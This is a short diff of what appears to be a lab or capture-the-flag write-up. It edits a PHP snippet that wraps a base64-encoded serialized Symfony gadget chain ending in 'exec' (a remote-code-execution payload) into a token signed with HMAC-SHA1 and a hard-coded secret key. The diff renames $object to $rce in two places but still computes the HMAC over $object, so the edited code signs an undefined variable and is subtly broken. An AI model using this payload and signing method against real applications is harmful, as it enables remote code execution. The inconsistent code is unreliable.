@@ -25,7 +25,7 @@
 ```PHP
 <?php 
 
-	$object = "";
+	$rce = "";
 
 	$secretKey = "7sbqv3xwfjipv4gmsofrqxlj4dcqr5dl";
 	
@@ -47,7 +47,7 @@
 ```PHP
 <?php 
 
-	$object = "
+	$rce = "
 Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBT
 eW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7
 TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M
@@ -60,7 +60,7 @@ lxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
 
 	$secretKey = "7sbqv3xwfjipv4gmsofrqxlj4dcqr5dl";
 	
-	echo $payload = urlencode('{"token":"' . $object . '", "sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+	echo $payload = urlencode('{"token":"' . $rce . '", "sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
 
 ?>
 ```
